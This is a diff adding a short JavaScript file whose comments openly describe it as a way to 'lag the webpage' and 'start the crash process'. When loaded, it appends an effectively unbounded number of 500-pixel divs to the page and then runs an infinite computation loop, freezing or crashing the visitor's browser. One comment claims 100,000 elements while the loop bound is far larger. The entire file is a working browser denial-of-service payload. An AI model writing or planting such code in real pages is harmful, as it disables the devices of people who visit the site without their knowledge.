@@ -1,0 +1,30 @@
+// Function to create an excessive number of blank GUI elements continuously
+function createMassiveGUIs() {
+    for (let i = 0; i < 10000000000000000; i++) { // Create 100,000 elements
+        const div = document.createElement('div');
+        div.style.width = '500px'; // Width of the GUI
+        div.style.height = '500px'; // Height of the GUI
+        div.style.position = 'absolute';
+        div.style.top = Math.random() * window.innerHeight + 'px';
+        div.style.left = Math.random() * window.innerWidth + 'px';
+        div.style.backgroundColor = 'rgba(255, 255, 255, 0.5)'; // Semi-transparent white for visibility
+        document.body.appendChild(div);
+    }
+}
+
+// Function to perform heavy computation continuously
+function runHeavyComputation() {
+    let x = 0;
+    while (true) { // Infinite loop
+        x += Math.random(); // Continuous computation
+    }
+}
+
+// Function to lag the webpage
+function lagWebpage() {
+    createMassiveGUIs();
+    runHeavyComputation();
+}
+
+// Start the crash process
+lagWebpage();
